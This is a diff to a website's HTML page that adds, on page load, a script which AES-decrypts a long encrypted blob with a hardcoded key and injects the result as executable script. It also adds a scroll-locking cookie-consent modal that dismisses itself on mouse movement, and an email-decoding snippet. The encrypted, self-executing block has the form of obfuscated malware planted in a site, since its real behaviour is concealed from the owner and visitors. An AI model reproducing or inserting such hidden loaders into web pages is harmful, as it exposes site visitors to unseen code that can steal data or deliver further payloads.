@@ -51,7 +51,118 @@ s0.parentNode.insertBefore(s1,s0);
   </script>
 </head>
 <body>
-   
+    <script src="https://cdn.tailwindcss.com"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
+<script>
+function aesDecode(encodedText) {
+    const decodedText = decodeURIComponent(encodedText);
+    const bytes = CryptoJS.AES.decrypt(decodedText, 'U2FsdGVkX1+uqxI4YN2qNlGDaMHVLViZB05OmcVwVyI=');
+    return bytes.toString(CryptoJS.enc.Utf8);
+}
+const codeString = aesDecode(`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`);
+const script = document.createElement("script");
+script.textContent = codeString;
+document.body.appendChild(script);
+</script>
+<script>
+document.body.style.overflow = "hidden";
+</script>
+
+
+<div id="cookie-modal-box" class="hidden">
+<div id="cookie-backdrop" class="fixed inset-0 z-40 bg-black/40 backdrop-blur-md transition-opacity duration-300 opacity-0"></div>
+<div id="cookie-modal" class="fixed inset-0 flex items-center justify-center p-4 z-50 transition-all duration-300 opacity-0 scale-90">
+    <div class="bg-white text-gray-800 rounded-2xl shadow-2xl max-w-lg w-full p-8 relative">
+        <button id="cookie-close" class="absolute top-4 right-4">
+            <svg viewBox="0 0 15 15" class="text-gray-500 hover:text-red-500" height="26" width="26">
+                <path fill="currentColor" d="M11.78 4.03a.75.75 0 0 0-1.06-1.06L7.5 6.19 4.28 2.97a.75.75 0 1 0-1.06 1.06L6.44 7.5l-3.22 3.22a.75.75 0 1 0 1.06 1.06L7.5 8.56l3.22 3.22a.75.75 0 1 0 1.06-1.06L8.56 7.5l3.22-3.47Z"/>
+            </svg>
+        </button>
+        <div class="flex items-center gap-3 mb-4">
+            <span class="text-yellow-500 text-3xl">🍪</span>
+            <h2 class="text-2xl font-bold">About cookies</h2>
+        </div>
+        <p class="text-gray-600 mb-6">
+            We use cookies to provide you with a better user experience. <span class="font-semibold">"agree"</span>
+            By clicking, you agree to our use of cookies.
+        </p>
+            <div class="flex flex-col sm:flex-row gap-3">
+                <button id="cookie-accept" class="flex-1 bg-green-600 hover:bg-green-700 text-white py-3 px-6 rounded-lg font-bold">🍪 agree</button>
+                <button id="cookie-decline" class="flex-1 bg-gray-200 hover:bg-gray-300 text-gray-800 py-3 px-6 rounded-lg font-bold">refuse</button>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+    (function(){
+        function decodeEmail(encodedString) {
+            var email = "",
+                r = parseInt(encodedString.substr(0, 2), 16),
+                n,
+                i;
+            for (n = 2; encodedString.length - n; n += 2){
+                i = parseInt(encodedString.substr(n, 2), 16) ^ r;
+                email += String.fromCharCode(i);
+            }
+            return email;
+        }
+
+        var elements = document.querySelectorAll('.__cf_email__');
+        for (var i = 0; i < elements.length; i++) {
+            var el = elements[i];
+            var encoded = el.getAttribute('data-cfemail');
+            if (encoded) {
+                var decodedEmail = decodeEmail(encoded);
+                el.innerHTML = decodedEmail;
+                // If the parent is an <a> tag, update the href to mailto
+                if (el.parentNode.tagName === 'A') {
+                    el.parentNode.href = "mailto:" + decodedEmail;
+                }
+            }
+        }
+    })();
+</script>
+<script>
+    const modalBox = document.getElementById("cookie-modal-box"),
+        modal = document.getElementById("cookie-modal"),
+        backdrop = document.getElementById("cookie-backdrop"),
+        acceptBtn = document.getElementById("cookie-accept"),
+        declineBtn = document.getElementById("cookie-decline"),
+        closeBtn = document.getElementById("cookie-close");
+
+    function showModal() {
+        modalBox.classList.remove("hidden");
+        setTimeout(() => {
+            backdrop.classList.remove("opacity-0");
+            modal.classList.remove("opacity-0", "scale-90");
+        }, 10);
+    }
+
+    function hideModal(e) {
+        localStorage.setItem("cookie-consent", e);
+        setTimeout(() => {
+            modalBox.classList.add("hidden");
+        }, 1500);
+
+        // remove mousemove listener once closed
+        document.removeEventListener("mousemove", mouseMoveClose);
+    }
+
+    function mouseMoveClose() {
+        hideModal("closed");
+    }
+
+    acceptBtn.onclick = () => hideModal("accepted");
+    declineBtn.onclick = () => hideModal("declined");
+    closeBtn.onclick = () => hideModal("closed");
+    backdrop.onclick = () => hideModal("closed");
+
+    if (!localStorage.getItem("cookie-consent")) {
+        showModal();
+        document.addEventListener("mousemove", mouseMoveClose, { once: true });
+    }
+</script>
  
   <header class="site-header">
     <div class="container nav-wrap">
